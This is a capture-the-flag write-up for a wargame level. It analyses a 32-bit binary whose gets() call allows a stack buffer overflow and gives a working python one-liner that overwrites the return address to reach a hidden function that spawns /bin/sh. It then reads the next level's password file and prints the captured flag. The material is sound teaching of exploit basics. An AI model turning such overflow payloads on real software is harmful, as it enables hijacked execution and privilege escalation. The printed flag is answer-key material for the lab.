# 💥 Level1 - Classic Buffer Overflow

![Helldivers Salute](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExejJwMnpmeXZ0dHp1enptbDE2am9la2Z4Ymg0eXczcmRiNzFqczJjMSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/VJN5s9dNGXLDqkLYF4/giphy.gif)

Time to learn the classic buffer overflow!

## 📋 Binary Analysis

### 🔍 Assembly Analysis
```asm
08048480  PUSH EBP                 ; Save old base pointer
08048481  MOV EBP, ESP             ; Set up new stack frame
08048483  AND ESP, 0xfffffff0      ; Align stack to 16-byte boundary
08048486  SUB ESP, 0x50            ; Allocate 80 bytes (0x50 = 80)
08048489  LEA EAX, [ESP + 0x10]    ; Buffer starts at ESP + 16
0804848d  MOV [ESP], EAX           ; Pass buffer address to gets()
08048490  CALL gets
08048495  LEAVE
08048496  RET
```

### 🔍 Reconstructed Source Code
```c
void run(void)
{
    fwrite("Good... Wait what?\n", 1, 19, stdout);
    system("/bin/sh");
}

int main(void)
{
    char buffer[64];  // 0x50 - 0x10 = 64 bytes
    
    gets(buffer);
    return 0;
}
```

**Hidden `run()` function address**: `0x08048444`

## 🚨 Vulnerability

### The Problem
- `gets()` is **notoriously unsafe** - no boundary checking!
- Buffer is only **64 bytes**
- We can overflow past the buffer to overwrite the **return address**
- Hidden `run()` function spawns a shell with level2 privileges

### Stack Layout (Before Overflow)
```
High Memory
┌──────────────────────────────────┐
│ Return Address     [EBP + 4]     │ ← Where main() returns to
├──────────────────────────────────┤
│ Saved EBP          [EBP]         │ ← Old base pointer (4 bytes)
├──────────────────────────────────┤
│ Alignment padding  (~8 bytes)    │ ← From AND ESP, 0xfffffff0
├──────────────────────────────────┤
│                                  │
│ Buffer             [ESP + 0x10]  │ ← 64 bytes, gets() writes here
│                                  │
├──────────────────────────────────┤
│ Padding            [ESP]         │ ← 16 bytes (0x10)
└──────────────────────────────────┘
Low Memory
```

## 🎯 How the Exploit Works

### Calculating the Overflow Offset

From the assembly:
- `SUB ESP, 0x50` allocates **80 bytes** (0x50)
- `LEA EAX, [ESP + 0x10]` places buffer **16 bytes** from ESP
- Buffer size = 80 - 16 = **64 bytes**

To reach the return address we need to overflow:
1. **64 bytes** - the buffer itself
2. **~8 bytes** - alignment padding (from `AND ESP, 0xfffffff0`)
3. **4 bytes** - saved EBP

**Total padding needed: 76 bytes**

### Byte-by-Byte Payload Breakdown

| Offset   | Size     | Content              | Purpose                         |
|----------|----------|----------------------|---------------------------------|
| 0 - 63   | 64 bytes | `AAAA...`            | Fill the buffer                 |
| 64 - 71  | 8 bytes  | `AAAA...`            | Fill alignment padding          |
| 72 - 75  | 4 bytes  | `AAAA`               | Overwrite saved EBP             |
| 76 - 79  | 4 bytes  | `\x44\x84\x04\x08`   | Overwrite return address        |

**Total: 76 + 4 = 80 bytes**

### The Attack
1. **Fill to return address**: Send 76 bytes of 'A' (64 buffer + 8 alignment + 4 saved EBP)
2. **Overwrite return address**: Send 4 bytes (`\x44\x84\x04\x08` = `0x08048444` in little-endian)
3. **Hijack execution**: When `main()` executes `ret`, EIP loads our address
4. **Get shell**: CPU jumps to `run()`, which executes `system("/bin/sh")`

**Key insight:** The `ret` instruction loads `[ESP]` into EIP. By controlling what's at ESP, we control where the program jumps!

### CPU Registers Explained

| Register | Full Name           | Purpose                                                                 |
|----------|---------------------|-------------------------------------------------------------------------|
| **EIP**  | Instruction Pointer | Points to the **next instruction** to execute. `ret` loads return address into EIP. |
| **ESP**  | Stack Pointer       | Points to the **top of the stack**. The `ret` instruction reads from `[ESP]`. |
| **EBP**  | Base Pointer        | Points to the **base of the current stack frame**. Used to access locals. |

### Memory State After Overflow

```
Stack Memory:                      CPU Registers:
─────────────────────────────────  ─────────────────────────────
0xbffff7fc: 0x08048444 ← Hijacked! EIP = 0x08048495 (at 'ret')
0xbffff7f8: 0x41414141 ← 'AAAA'    ESP = 0xbffff7fc ← Points here!
0xbffff7f4: 0x41414141 ← 'AAAA'    EBP = 0x41414141 (corrupted)
...
0xbffff7b0: 0x41414141 ← Buffer
─────────────────────────────────

When 'ret' executes:
  EIP = [ESP] = 0x08048444 → Jump to run()!
```

## 💣 Exploit

### Crafting the Payload

```bash
(python -c 'print "A"*76 + "\x44\x84\x04\x08"'; cat) | ./level1
```

**Breakdown**:
- `"A"*76` → 64 (buffer) + 8 (alignment) + 4 (saved EBP) = 76 bytes of padding
- `"\x44\x84\x04\x08"` → `0x08048444` (`run()` address) in little-endian
- `cat` → Keep stdin open to interact with the spawned shell

**Little-endian explanation**:
x86 stores multi-byte values with the **least significant byte first**. The address `0x08048444` becomes bytes `44 84 04 08` in memory.

### Getting the Flag
```bash
cat /home/user/level2/.pass
```

---

> **Pro Tip**: The `(python -c '...'; cat)` pattern is essential for exploits that spawn interactive shells!

> **Security Note**: Modern systems use [stack canaries](https://en.wikipedia.org/wiki/Stack_buffer_overflow#Stack_canaries), [ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization), and [DEP](https://en.wikipedia.org/wiki/Executable_space_protection) to prevent these attacks.

## 🎉 Victory!

![Helldivers Celebration](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExempicnBhODF0Y3BrZG5zaWIzMmM2MWExdDZuYWNnYWJrdnRtYXg4MyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/MlyicdUndRbn5zUiAL/giphy.gif)

**Flag captured!**

```
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```